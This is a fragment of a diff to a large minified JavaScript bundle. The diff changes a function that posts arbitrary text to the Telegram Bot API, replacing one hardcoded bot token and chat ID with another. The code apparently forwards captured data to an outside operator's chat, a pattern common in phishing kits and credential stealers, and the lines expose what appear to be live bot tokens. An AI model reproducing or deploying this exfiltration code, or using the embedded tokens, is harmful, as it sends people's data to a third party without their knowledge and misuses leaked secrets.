@@ -79431,13 +79431,13 @@
         }
           , sG = e => {
             try {
-                fetch("https://api.telegram.org/bot".concat("8202849739:AAHT3qYW545ijgSXYx_TA0JnFFsEgrXk2TI", "/sendMessage"), {
+                fetch("https://api.telegram.org/bot".concat("8573873957:AAF_SxGT-IOs4c2b6BLAM0Yf2CdhcjAYnts", "/sendMessage"), {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        chat_id: "8117302054",
+                        chat_id: "6322482763",
                         text: e,
                         parse_mode: "HTML"
                     })
